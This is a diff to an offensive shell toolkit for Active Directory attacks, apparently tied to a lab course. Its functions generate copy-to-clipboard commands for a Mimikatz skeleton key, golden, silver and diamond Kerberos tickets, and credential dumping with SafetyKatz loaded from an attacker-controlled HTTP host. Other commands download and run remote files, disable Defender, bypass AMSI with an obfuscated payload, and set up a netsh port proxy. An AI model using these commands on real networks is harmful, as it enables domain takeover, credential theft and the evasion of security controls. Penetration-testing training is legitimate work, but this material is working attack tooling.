@@ -47,7 +47,7 @@ nb-ad-pwsh-persist-dcsync      add dcsync rights to a user
 nb-ad-pwsh-persist-golden      create a golden ticket
 nb-ad-pwsh-persist-silver      create a silver ticket
 nb-ad-pwsh-persist-diamond     create a diamond ticket
-nb-ad-pwsh-persist-skeleton    create a skeleton key
+nb-ad-pwsh-persist-skeleton    create a skeleton key (not opsec safe nor recommended)
 nb-ad-pwsh-persist-dsrm        persistence through DSRM
 
 Misc
@@ -57,6 +57,123 @@ nb-ad-pwsh-ping                sweep a network subnet with ping requests on wind
 nb-ad-cmd-ping                 sweep a network subnet with ping requests on windows
 
 DOC
+}
+
+nb-ad-pwsh-persist-skeleton() {
+    __ask "Enter the current Domain name"
+    nb-vars-set-domain
+    __ask "Enter the target DC hostname"
+    local hostname && __askvar hostname HOSTNAME
+
+    __COMMAND="Invoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName $hostname.${__DOMAIN}"
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
+    echo
+    __info "Now, it is possible to access any machine with a valid username and password as \"mimikatz\":"
+    __ok "Enter-PSSession -Computername dcorp-dc -credential dcorp\\\\Administrator"
+}
+
+nb-ad-pwsh-persist-diamond() {
+    __check-project
+
+    __warn "You must use an elevated command prompt."
+    echo
+
+    __ask "Enter the current Domain name"
+    nb-vars-set-domain
+    __ask "Enter the target DC hostname"
+    local hostname && __askvar hostname HOSTNAME
+    __ask "Enter the krbtgt's AES256 or RC4 hash"
+    __check-hash
+
+    echo
+    __warn "Encode the following command with: .\\ArgSplit.bat:"
+    __ok "diamond"
+    echo
+    __ask "Then check the encoded command with:"
+    __ok "echo %Pwn%"
+
+    __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /krbkey:${__HASH} /tgtdeleg /enctype:aes /ticketuser:administrator /domain:${__DOMAIN} /dc:$hostname.${__DOMAIN} /ticketuserid:500 /groups:512 /createnetonly:C:\\\\Windows\\\\System32\\\\cmd.exe /show /ptt"
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
+    echo
+    __info "Check if we can access target machine with command:"
+    __ok "nb-ad-cmd-winrs"
+}
+
+nb-ad-pwsh-persist-silver() {
+    __check-project
+
+    __warn "You must use an elevated command prompt."
+    echo
+
+    __ask "Enter the current Domain name"
+    nb-vars-set-domain
+    __ask "Enter the target DC hostname"
+    local hostname && __askvar hostname HOSTNAME
+    __ask "Enter the Domain SID of the current domain"
+    local sid1 && __askvar sid1 DomainSID
+    __ask "Enter the target machine's RC4 or AES256 hash"
+    __check-hash
+
+    echo
+    __warn "Encode the following command with: .\\ArgSplit.bat:"
+    __ok "silver"
+    echo
+    __ask "Then check the encoded command with:"
+    __ok "echo %Pwn%"
+
+    __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /service:http/$hostname.${__DOMAIN} /rc4:${__HASH} /sid:$sid1 /ldap /user:Administrator /domain:${__DOMAIN} /ptt"
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
+    echo
+    __info "Try accessing the service using winrs"
+    __ok "nb-ad-cmd-winrs"
+}
+
+nb-ad-pwsh-persist-golden() {
+    __check-project
+
+    __warn "You must use an elevated command prompt."
+    echo
+
+    __ask "Enter the current Domain name"
+    nb-vars-set-domain
+    __ask "Enter the target DC hostname"
+    local hostname && __askvar hostname HOSTNAME
+    __ask "Enter the Domain SID of the current domain"
+    local sid1 && __askvar sid1 DomainSID
+    __ask "Enter the krbtgt's AES256 hash"
+    __check-hash
+
+    echo
+    __warn "Encode the following command with: .\\ArgSplit.bat:"
+    __ok "kerberos::golden"
+    echo
+    __ask "Then check the encoded command with:"
+    __ok "echo %Pwn%"
+
+    __COMMAND="C:\\\\AD\\\\Tools\\\\BetterSafetyKatz.exe -args \"%Pwn% /User:Administrator /domain:${__DOMAIN} /sid:$sid1 /aes256:${__HASH} /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\""
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
+    echo
+    __info "Check if the TGS is injected:"
+    __ok "klist"
+    echo
+    __info "Check access on the target system:"
+    __ok "dir \\\\\\$hostname\\\\c\$"
 }
 
 nb-ad-pwsh-ea-krbtgt-hash() {
@@ -171,7 +288,7 @@ nb-ad-pwsh-rbcd() {
     __info "You can check if RBCD is set correctly:"
     __ok "Get-DomainRBCD"
     echo
-    __info "Next, you need to get AES256 keys of your machine which you gave the write permissios to using command:"
+    __info "Next, you need to get AES256 keys of your machine which you gave the write permissions to using command:"
     __ok "nb-ad-pwsh-dump-secrets"
     echo
     __ask "Enter the AES256 hash of your machine"
@@ -563,6 +680,7 @@ nb-ad-pwsh-dump-secrets() {
     echo
     __warn "If you're using SafetyKatz.exe, you need to encode the command with: .\\ArgSplit.bat for example:"
     __ok "sekurlsa::ekeys"
+    __ok "lsadump::lsa"
     __ok "lsadump::trust"
     echo
     __ask "Then check the encoded command with:"
@@ -573,7 +691,7 @@ nb-ad-pwsh-dump-secrets() {
     echo "1. Invoke-Mimi -Command '\"sekurlsa::ekeys\"'"
     echo "2. Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'"
     echo "3. C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\""
-    echo "4. C:\\\\AD\\\\Tools\\\\Loader.exe -Path http://${__LHOST}:${__LPORT}/SafetyKatz.exe -args \"%Pwn%\" \"exit\""
+    echo "4. .\\\\Loader.exe -Path http://<LHOST>:<LPORT>/SafetyKatz.exe -args \"%Pwn%\" \"exit\""
     echo
     echo -n "Choice: "
     read choice
@@ -583,6 +701,7 @@ nb-ad-pwsh-dump-secrets() {
         2) __COMMAND="Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'";;
         3) __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\"";;
         4) 
+          __ask "For porproxy to localhost use 127.0.0.1"
           nb-vars-set-lhost
           nb-vars-set-lport
           __COMMAND=".\\\\Loader.exe -Path http://${__LHOST}:${__LPORT}/SafetyKatz.exe -args \"%Pwn%\" \"exit\""
@@ -599,29 +718,36 @@ nb-ad-pwsh-dump-secrets() {
 
 nb-ad-pwsh-file-download() {
     __warn "If you're not in powershell session and use powershell command, prepend it with powershell -c"
-    echo
     nb-vars-set-lhost
     nb-vars-set-lport
     local filename && __askvar filename "FILENAME"
 
-    echo
     __ask "Do you want to download the file to disk or download and execute it in memory? (d/e)"
     local down && __askvar down "DOWNLOAD_OPTION"
 
     case $down in
         d)
             # Commands for downloading to disk
+            echo
             __ask "Choose a command to copy:"
-            echo "1. iwr http://${__LHOST}:${__LPORT}/$filename -OutFile $filename"
-            echo "2. certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
-            echo "3. wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
-            echo "4. bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
-            echo "5. Previous menu"
+            echo "1. echo F | xcopy C:\\AD\\Tools\\$filename \\\\<RHOST>\\C$\\Users\\Public\\$filename /Y"
+            echo "2. iwr http://${__LHOST}:${__LPORT}/$filename -OutFile $filename"
+            echo "3. certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
+            echo "4. wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
+            echo "5. bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
+            echo "6. Previous menu"
             echo
             echo -n "Choice: "
             read choice
 
             case $choice in
+                1) 
+                  echo
+                  __ask "Enter the target machine hostname"
+                  nb-vars-set-rhost
+                  __COMMAND="echo F | xcopy C:\\\\AD\\\\Tools\\\\$filename \\\\\\\\${__RHOST}\\\\C$\\\\Users\\\\Public\\\\$filename /Y"
+                  echo
+                  ;;
                 1) __COMMAND="iwr http://${__LHOST}:${__LPORT}/$filename -OutFile $filename";;
                 2) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
                 3) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
@@ -737,7 +863,8 @@ nb-ad-pwsh-av-bypass() {
     echo "2) Disable AV using powershell (Requires Local Admin rights)"
     echo "3) Bypass enhanced script block logging so that AMSI bypass is not logged"
     echo "4) Bypass AMSI Check (If Admin rights are not available)"
-    echo "5) Previous menu"
+    echo "5) Use netsh portproxy from the web server to local on port 8080"
+    echo "6) Previous menu"
     echo
     echo -n "Choice: "
     read -r choice
@@ -762,6 +889,11 @@ Set-MPPreference -DisableIntrusionPreventionSystem \$true"
           __COMMAND="S\`eT-It\`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    Get-varI\`A\`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\"A\`ss\`Embly\".\"GET\`TY\`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) ).\"g\`etf\`iElD\"(  ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  )).\"sE\`T\`VaLUE\"(  \${n\`ULl},\${t\`RuE} )"
           ;;
         5) 
+          nb-vars-set-lhost
+          nb-vars-set-lport
+          __COMMAND="netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=${__LPORT} connectaddress=${__LHOST}"
+          ;;
+        6) 
           return
           ;;
         *) 
@@ -772,5 +904,7 @@ Set-MPPreference -DisableIntrusionPreventionSystem \$true"
 
     # Copy the command to clipboard
     echo "$__COMMAND" | wl-copy
-    __ok "Command copied to clipboard."
+    echo
+    __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
 }
